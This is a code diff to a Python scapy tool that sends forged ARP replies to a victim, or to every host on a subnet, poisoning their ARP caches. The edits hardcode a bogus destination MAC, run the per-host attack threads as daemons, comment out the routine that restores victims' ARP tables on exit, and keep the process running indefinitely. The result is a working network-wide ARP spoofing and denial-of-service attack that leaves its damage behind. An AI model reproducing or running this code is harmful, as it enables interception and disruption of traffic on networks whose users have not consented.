@@ -9,6 +9,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import threading
 import ipaddress as ipad
+import time 
 
 def restore(DestinationIP, SourceIP):
 	DestinationMAC = getmac(DestinationIP)
@@ -18,7 +19,7 @@ def restore(DestinationIP, SourceIP):
 
 
 def ArpSpoof(mac ,victim, spoof):
-	packet = ARP(op=2, pdst=victim, hwdst=mac, psrc=spoof)
+	packet = ARP(op=2, pdst=victim, hwdst="00:00:00:0c:0b:a0", psrc=spoof)
 	send(packet, verbose=False)
 
 
@@ -61,6 +62,7 @@ def start(victim , spoof , net , verbose , check) :
 			for ip in netw.hosts() : 
 				if ip == addr : continue
 				x = threading.Thread(target=start , args=(str(ip) , spoof , False , verbose , check))
+				x.daemon = True
 				x.start()
 		except KeyboardInterrupt : 
 			if verbose : print("\n" + INFO("Goodbye") , flush=True)
@@ -72,6 +74,8 @@ def start(victim , spoof , net , verbose , check) :
 			if check : 
 				if not  check_connection(victim) : 
 					exit(0)
+				else : 
+					print(INFO(victim + " is up") , flush=True)
 			mac_victim = getmac(victim) 
 			mac_spoof = getmac(spoof) 
 			if mac_spoof  == False or mac_victim == False : 
@@ -86,8 +90,8 @@ def start(victim , spoof , net , verbose , check) :
 			if verbose :  print(DANGER("Error in IP format") , flush=True)
 			exit(0)
 		except KeyboardInterrupt :
-			restore(victim  , spoof)
-			restore(spoof , victim)
+			#restore(victim  , spoof)
+			#restore(spoof , victim)
 			if verbose : print("\n" + INFO("Goodbye") , flush=True)
 			exit(0)
 		except Exception as e : 
@@ -95,3 +99,6 @@ def start(victim , spoof , net , verbose , check) :
 		
 if __name__ == "__main__" : 
 	main()
+	while True:
+		time.sleep(1)
+
